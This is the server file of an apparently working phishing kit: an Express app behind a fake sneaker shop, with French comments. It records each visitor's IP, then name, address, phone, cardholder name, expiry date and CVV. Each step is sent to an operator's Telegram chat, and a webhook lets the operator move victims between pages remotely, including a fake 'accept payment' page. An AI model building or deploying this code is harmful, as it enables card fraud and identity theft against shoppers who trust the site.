import express from "express";
import path from "path";
import bodyParser from "body-parser";
import cors from "cors";
import fetch from "node-fetch";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if (!BOT_TOKEN || !CHAT_ID)
  console.warn("⚠️ BOT_TOKEN ou CHAT_ID non défini.");

const sessions = {}; // ip -> {data, redirect, lastNotif, confirmed}

// ====== Helper : récupérer IPv4 ======
function getIP(req) {
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (ip.includes(",")) ip = ip.split(",")[0];
  if (ip.includes("::ffff:")) ip = ip.split("::ffff:")[1];
  return ip.trim();
}

// ====== Envoi notification Telegram ======
async function sendTelegramNotif(data) {
  if (!TELEGRAM_API || !CHAT_ID) return;

  const lines = [];
  lines.push("🆕 <b>Nouvelle interaction</b>");
  if (data.ip) lines.push("🌐 <b>IP:</b> " + data.ip);
  if (data.page) lines.push("📄 <b>Page:</b> " + data.page);
  if (data.pair) lines.push("👟 <b>Paire choisie:</b> " + data.pair);
  if (data.delivery) {
    lines.push(`📦 <b>Nom:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
    lines.push(`📞 <b>Téléphone:</b> ${data.delivery.telephone}`);
  }
  if (data.card) {
    lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);
    lines.push(`📝 <b>Nom titulaire:</b> ${data.card.nomTitulaire}`);
    lines.push(`📅 <b>Expiration:</b> ${data.card.expiry}`);
    lines.push(`🔒 <b>CVV:</b> ${data.card.cvv}`);
  }

  const text = lines.join("\n");

  const keyboard = {
    inline_keyboard: [
      [{ text: "🏠 Accueil", callback_data: "redirect|" + data.ip + "|/" }],
      [{ text: "👟 Produit", callback_data: "redirect|" + data.ip + "|/product.html" }],
      [{ text: "📦 Livraison", callback_data: "redirect|" + data.ip + "|/delivery.html" }],
      [{ text: "💳 Paiement", callback_data: "redirect|" + data.ip + "|/payment.html" }],
      [{ text: "✅ Accepter Paiement", callback_data: "redirect|" + data.ip + "|/success.html" }]
    ]
  };

  try {
    await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
    });
  } catch (err) {
    console.error("Erreur Telegram:", err);
  }
}

// ====== ENDPOINTS ======

// ✅ Visite initiale
app.get("/api/visit", (req, res) => {
  const ip = getIP(req);
  if (!sessions[ip]) sessions[ip] = { data: { ip, page: "Accueil" }, redirect: null };
  if (!sessions[ip].lastNotif || Date.now() - sessions[ip].lastNotif > 3000) {
    sendTelegramNotif(sessions[ip].data);
    sessions[ip].lastNotif = Date.now();
  }
  res.json({ ok: true, ip });
});

// ✅ Interaction produit
app.post("/api/pair", (req, res) => {
  const { pair } = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
  sessions[ip].data.page = "Produit";
  sessions[ip].data.pair = pair;
  sendTelegramNotif(sessions[ip].data);
  sessions[ip].redirect = "/delivery.html";
  res.json({ ok: true });
});

// ✅ Livraison
app.post("/api/delivery", (req, res) => {
  const { nom, prenom, adresse, telephone } = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
  sessions[ip].data.page = "Livraison";
  sessions[ip].data.delivery = { nom, prenom, adresse, telephone };
  sendTelegramNotif(sessions[ip].data);
  sessions[ip].redirect = "/payment.html";
  res.json({ ok: true });
});

// ✅ Paiement
app.post("/api/payment", (req, res) => {
  const { cardNumber, expiry, cvv, nomTitulaire } = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null };
  sessions[ip].data.page = "Paiement";
  sessions[ip].data.card = {
    panMasked: "**** **** **** " + (cardNumber ? cardNumber.slice(-4) : "0000"),
    expiry,
    cvv,
    nomTitulaire,
  };
  sendTelegramNotif(sessions[ip].data);
  sessions[ip].redirect = "/loader.html";
  res.json({ ok: true });
});

// ✅ Loader -> success après validation admin
app.get("/api/status", (req, res) => {
  const ip = getIP(req);
  const redirect = sessions[ip]?.redirect || null;
  res.json({ redirect });
});

// ✅ Confirmation navigateur : stop boucle
app.post("/api/ack", (req, res) => {
  const ip = getIP(req);
  if (sessions[ip]) sessions[ip].redirect = null;
  res.json({ ok: true });
});

// ✅ Webhook Telegram : redirection admin à distance
app.post("/telegramWebhook", bodyParser.json(), async (req, res) => {
  const body = req.body;
  if (body?.callback_query) {
    const cb = body.callback_query;
    const [action, ip, url] = (cb.data || "").split("|");

    if (action === "redirect" && sessions[ip]) {
      sessions[ip].redirect = url;
      sessions[ip].data.page = "Redirection admin vers " + url;
      sendTelegramNotif(sessions[ip].data);

      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: "✅ Redirection envoyée à l'utilisateur.",
        }),
      });
    }
  }
  res.sendStatus(200);
});

// ====== Pages HTML ======
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/product.html", (req, res) => res.sendFile(path.join(__dirname, "public", "product.html")));
app.get("/delivery.html", (req, res) => res.sendFile(path.join(__dirname, "public", "delivery.html")));
app.get("/payment.html", (req, res) => res.sendFile(path.join(__dirname, "public", "payment.html")));
app.get("/loader.html", (req, res) => res.sendFile(path.join(__dirname, "public", "loader.html")));
app.get("/success.html", (req, res) => res.sendFile(path.join(__dirname, "public", "success.html")));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("✅ Server listening on port", PORT));

